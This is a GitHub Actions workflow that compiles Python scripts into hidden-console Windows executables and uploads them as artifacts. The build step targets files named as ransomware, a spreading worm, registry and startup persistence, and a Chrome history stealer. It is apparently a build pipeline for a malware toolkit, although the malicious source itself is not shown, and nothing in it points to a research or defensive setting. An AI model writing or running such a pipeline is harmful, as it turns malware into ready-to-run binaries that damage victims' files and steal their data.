name: Compile Python Executable

on:
  push:
    branches: [ "main" ]
  pull_request:
    branches: [ "main" ]
  workflow_dispatch: # Allows you to trigger the build manually

jobs:
  build-windows:
    # Crucial: Must use Windows to compile a Windows .exe file
    runs-on: windows-latest

    steps:
    # Step 1: Pull your repository code into the runner
    - name: Checkout Repository
      uses: actions/checkout@v4

    # Step 2: Install Python environment
    - name: Set up Python
      uses: actions/setup-python@v5
      with:
        python-version: '3.11' # Change to your preferred Python version
        cache: 'pip'          # Caches packages to speed up future runs

    # Step 3: Install PyInstaller and any project dependencies
    - name: Install Dependencies
      run: |
        python -m pip install --upgrade pip
        pip install pyinstaller
        if (Test-Path requirements.txt) { pip install -r requirements.txt }

    # Step 4: Compile the Python script into a standalone .exe
    - name: Build Executable with PyInstaller
      run: |
        pyinstaller --onefile --windowed Ransomware/ransomware.py
        pyinstaller --onefile --windowed Spreading/worm2.py
        pyinstaller --onefile --windowed Startup/addtoregistrykey.py
        pyinstaller --onefile --windowed Startup/addtostartup.py
        pyinstaller --onefile --windowed Stealing/gethistoryChrome.py
      # Note: 
      # --onefile packages everything into a single .exe
      # --windowed hides the console window (remove if it is a CLI app)

    # Step 5: Save the compiled file so you can download it from GitHub
    - name: Upload Build Artifacts
      uses: actions/upload-artifact@v4
      with:
        name: windows-executables
        path: dist/*.exe
